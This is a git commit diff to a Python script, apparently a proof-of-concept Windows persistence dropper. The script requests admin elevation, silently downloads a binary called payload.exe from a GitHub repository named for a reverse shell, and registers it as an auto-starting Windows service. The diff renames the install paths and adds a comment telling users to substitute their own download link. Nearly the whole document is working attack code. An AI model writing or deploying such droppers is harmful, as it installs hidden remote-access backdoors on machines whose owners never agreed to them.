c95320c86c1eb2c44c0353d325b7e0d7848f94f7
/etc/passwd <218783009+larplimiter14@users.noreply.github.com>
2026-04-29 21:59:21 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,21 +1,18 @@
 import subprocess, os, ctypes, sys
 
-# Ai code (not dealing with windll bullshit) YET!
+# Ai code (not dealing with windll bs)
 if not ctypes.windll.shell32.IsUserAnAdmin():
     ctypes.windll.shell32.ShellExecuteW(
         None, "runas", sys.executable, " ".join(sys.argv), None, 1
     )
     sys.exit()
-#################################################
+#######################################
 
-directory = r"C:\Program Files\Larp_Project"
+directory = r"C:\Program Files\PoC_Persistance"
 
-pricetopay = rf"powershell -Command iwr https://raw.githubusercontent.com/larplimiter14/Simple-Rev-Shell-/refs/heads/main/SimpleRevShell/payload.exe -OutFile 'c:\program files\larp_project\Larp.exe'"
+pricetopay = rf"powershell -Command iwr https://raw.githubusercontent.com/larplimiter14/Simple-Rev-Shell-/refs/heads/main/SimpleRevShell/payload.exe -OutFile 'c:\program files\PoC_Persistance\poc.exe'" # Put in ur own github/download link
 
 os.makedirs(directory, exist_ok=True)
 
 subprocess.run(pricetopay, creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.run(rf'sc create LarpProjectService binPath="c:\Program Files\Larp_Project\Larp.exe" start=Auto', creationflags=subprocess.CREATE_NO_WINDOW)
-
-with open(rf"C:\Program Files\Larp_Project\test.txt", "w") as f:
-    f.write("test")
+subprocess.run(rf'sc create PoC_Persistance binPath="c:\program files\PoC_Persistance\poc.exe" start=Auto', creationflags=subprocess.CREATE_NO_WINDOW)
